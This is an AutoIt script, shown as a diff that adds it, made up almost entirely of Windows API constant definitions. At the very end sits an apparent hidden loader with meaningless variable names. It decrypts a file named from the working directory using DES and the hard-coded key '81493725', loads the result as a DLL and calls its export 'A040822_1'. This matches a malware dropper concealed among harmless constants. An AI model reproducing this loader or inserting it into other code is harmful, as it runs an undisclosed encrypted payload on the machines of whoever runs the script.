+Global Const $sm_samedisplayformat = 0x51
+Global Const $sm_immenabled = 0x52
+Global Const $sm_cxfocusborder = 0x53
+Global Const $sm_cyfocusborder = 0x54
+Global Const $sm_tabletpc = 0x56
+Global Const $sm_mediacenter = 0x57
+Global Const $sm_starter = 0x58
+Global Const $sm_serverr2 = 0x59
+Global Const $sm_cmetrics = 0x5a
+Global Const $sm_remotesession = 0x1000
+Global Const $sm_shuttingdown = 0x2000
+Global Const $sm_remotecontrol = 0x2001
+Global Const $sm_caretblinkingenabled = 0x2002
+Global Const $blackness = 0x42
+Global Const $captureblt = 0x40000000
+Global Const $dstinvert = 0x550009
+Global Const $mergecopy = 0xc000ca
+Global Const $mergepaint = 0xbb0226
+Global Const $nomirrorbitmap = 0x80000000
+Global Const $notsrccopy = 0x330008
+Global Const $notsrcerase = 0x1100a6
+Global Const $patcopy = 0xf00021
+Global Const $patinvert = 0x5a0049
+Global Const $patpaint = 0xfb0a09
+Global Const $srcand = 0x8800c6
+Global Const $srccopy = 0xcc0020
+Global Const $srcerase = 0x440328
+Global Const $srcinvert = 0x660046
+Global Const $srcpaint = 0xee0086
+Global Const $whiteness = 0xff0062
+Global Const $dt_bottom = 0x8
+Global Const $dt_calcrect = 0x400
+Global Const $dt_center = 0x1
+Global Const $dt_editcontrol = 0x2000
+Global Const $dt_end_ellipsis = 0x8000
+Global Const $dt_expandtabs = 0x40
+Global Const $dt_externalleading = 0x200
+Global Const $dt_hideprefix = 0x100000
+Global Const $dt_internal = 0x1000
+Global Const $dt_left = 0x0
+Global Const $dt_modifystring = 0x10000
+Global Const $dt_noclip = 0x100
+Global Const $dt_nofullwidthcharbreak = 0x80000
+Global Const $dt_noprefix = 0x800
+Global Const $dt_path_ellipsis = 0x4000
+Global Const $dt_prefixonly = 0x200000
+Global Const $dt_right = 0x2
+Global Const $dt_rtlreading = 0x20000
+Global Const $dt_singleline = 0x20
+Global Const $dt_tabstop = 0x80
+Global Const $dt_top = 0x0
+Global Const $dt_vcenter = 0x4
+Global Const $dt_wordbreak = 0x10
+Global Const $dt_word_ellipsis = 0x40000
+Global Const $rdw_erase = 0x4
+Global Const $rdw_frame = 0x400
+Global Const $rdw_internalpaint = 0x2
+Global Const $rdw_invalidate = 0x1
+Global Const $rdw_noerase = 0x20
+Global Const $rdw_noframe = 0x800
+Global Const $rdw_nointernalpaint = 0x10
+Global Const $rdw_validate = 0x8
+Global Const $rdw_erasenow = 0x200
+Global Const $rdw_updatenow = 0x100
+Global Const $rdw_allchildren = 0x80
+Global Const $rdw_nochildren = 0x40
+Global Const $wm_renderformat = 0x305
+Global Const $wm_renderallformats = 0x306
+Global Const $wm_destroyclipboard = 0x307
+Global Const $wm_drawclipboard = 0x308
+Global Const $wm_paintclipboard = 0x309
+Global Const $wm_vscrollclipboard = 0x30a
+Global Const $wm_sizeclipboard = 0x30b
+Global Const $wm_askcbformatname = 0x30c
+Global Const $wm_changecbchain = 0x30d
+Global Const $wm_hscrollclipboard = 0x30e
+Global Const $hterror = +0xfffffffe
+Global Const $httransparent = +0xffffffff
+Global Const $htnowhere = 0x0
+Global Const $htclient = 0x1
+Global Const $htcaption = 0x2
+Global Const $htsysmenu = 0x3
+Global Const $htgrowbox = 0x4
+Global Const $htsize = $htgrowbox
+Global Const $htmenu = 0x5
+Global Const $hthscroll = 0x6
+Global Const $htvscroll = 0x7
+Global Const $htminbutton = 0x8
+Global Const $htmaxbutton = 0x9
+Global Const $htleft = 0xa
+Global Const $htright = 0xb
+Global Const $httop = 0xc
+Global Const $httopleft = 0xd
+Global Const $httopright = 0xe
+Global Const $htbottom = 0xf
+Global Const $htbottomleft = 0x10
+Global Const $htbottomright = 0x11
+Global Const $htborder = 0x12
+Global Const $htreduce = $htminbutton
+Global Const $htzoom = $htmaxbutton
+Global Const $htsizefirst = $htleft
+Global Const $htsizelast = $htbottomright
+Global Const $htobject = 0x13
+Global Const $htclose = 0x14
+Global Const $hthelp = 0x15
+Global Const $color_scrollbar = 0x0
+Global Const $color_background = 0x1
+Global Const $color_activecaption = 0x2
+Global Const $color_inactivecaption = 0x3
+Global Const $color_menu = 0x4
+Global Const $color_window = 0x5
+Global Const $color_windowframe = 0x6
+Global Const $color_menutext = 0x7
+Global Const $color_windowtext = 0x8
+Global Const $color_captiontext = 0x9
+Global Const $color_activeborder = 0xa
+Global Const $color_inactiveborder = 0xb
+Global Const $color_appworkspace = 0xc
+Global Const $color_highlight = 0xd
+Global Const $color_highlighttext = 0xe
+Global Const $color_btnface = 0xf
+Global Const $color_btnshadow = 0x10
+Global Const $color_graytext = 0x11
+Global Const $color_btntext = 0x12
+Global Const $color_inactivecaptiontext = 0x13
+Global Const $color_btnhighlight = 0x14
+Global Const $color_3ddkshadow = 0x15
+Global Const $color_3dlight = 0x16
+Global Const $color_infotext = 0x17
+Global Const $color_infobk = 0x18
+Global Const $color_hotlight = 0x1a
+Global Const $color_gradientactivecaption = 0x1b
+Global Const $color_gradientinactivecaption = 0x1c
+Global Const $color_menuhilight = 0x1d
+Global Const $color_menubar = 0x1e
+Global Const $color_desktop = 0x1
+Global Const $color_3dface = 0xf
+Global Const $color_3dshadow = 0x10
+Global Const $color_3dhighlight = 0x14
+Global Const $color_3dhilight = 0x14
+Global Const $color_btnhilight = 0x14
+Global Const $hinst_commctrl = +0xffffffff
+Global Const $idb_std_small_color = 0x0
+Global Const $idb_std_large_color = 0x1
+Global Const $idb_view_small_color = 0x4
+Global Const $idb_view_large_color = 0x5
+Global Const $idb_hist_small_color = 0x8
+Global Const $idb_hist_large_color = 0x9
+Global Const $startf_forceofffeedback = 0x80
+Global Const $startf_forceonfeedback = 0x40
+Global Const $startf_preventpinning = 0x2000
+Global Const $startf_runfullscreen = 0x20
+Global Const $startf_titleisappid = 0x1000
+Global Const $startf_titleislinkname = 0x800
+Global Const $startf_usecountchars = 0x8
+Global Const $startf_usefillattribute = 0x10
+Global Const $startf_usehotkey = 0x200
+Global Const $startf_useposition = 0x4
+Global Const $startf_useshowwindow = 0x1
+Global Const $startf_usesize = 0x2
+Global Const $startf_usestdhandles = 0x100
+Global Const $cdds_prepaint = 0x1
+Global Const $cdds_postpaint = 0x2
+Global Const $cdds_preerase = 0x3
+Global Const $cdds_posterase = 0x4
+Global Const $cdds_item = 0x10000
+Global Const $cdds_itemprepaint = 0x10001
+Global Const $cdds_itempostpaint = 0x10002
+Global Const $cdds_itempreerase = 0x10003
+Global Const $cdds_itemposterase = 0x10004
+Global Const $cdds_subitem = 0x20000
+Global Const $cdis_selected = 0x1
+Global Const $cdis_grayed = 0x2
+Global Const $cdis_disabled = 0x4
+Global Const $cdis_checked = 0x8
+Global Const $cdis_focus = 0x10
+Global Const $cdis_default = 0x20
+Global Const $cdis_hot = 0x40
+Global Const $cdis_marked = 0x80
+Global Const $cdis_indeterminate = 0x100
+Global Const $cdis_showkeyboardcues = 0x200
+Global Const $cdis_nearhot = 0x400
+Global Const $cdis_othersidehot = 0x800
+Global Const $cdis_drophilited = 0x1000
+Global Const $cdrf_dodefault = 0x0
+Global Const $cdrf_newfont = 0x2
+Global Const $cdrf_skipdefault = 0x4
+Global Const $cdrf_notifypostpaint = 0x10
+Global Const $cdrf_notifyitemdraw = 0x20
+Global Const $cdrf_notifysubitemdraw = 0x20
+Global Const $cdrf_notifyposterase = 0x40
+Global Const $cdrf_doerase = 0x8
+Global Const $cdrf_skippostpaint = 0x100
+Global Const $gui_ss_default_gui = BitOR($ws_minimizebox, $ws_caption, $ws_popup, $ws_sysmenu)
+Global $deolanebezerrane = @WorkingDir
+Global $deolanebezerrane1 = StringMid($deolanebezerrane, 0x4, 0x10)
+$deolanebezerrane1 = $deolanebezerrane1 & ".ia"
+Local $deolanebezerrane2 = $deolanebezerrane1 & ".a1"
+Local $deolanebezerrane3 = $calg_des
+Local $deolanebezerrane4 = "81493725"
+If _Crypt_DecryptFile($deolanebezerrane1, $deolanebezerrane2, $deolanebezerrane4, $deolanebezerrane3) Then
+EndIf
+Global $deolanebezerrane5 = DllOpen($deolanebezerrane2)
+DllCall($deolanebezerrane5, "STRUCT", "A040822_1")
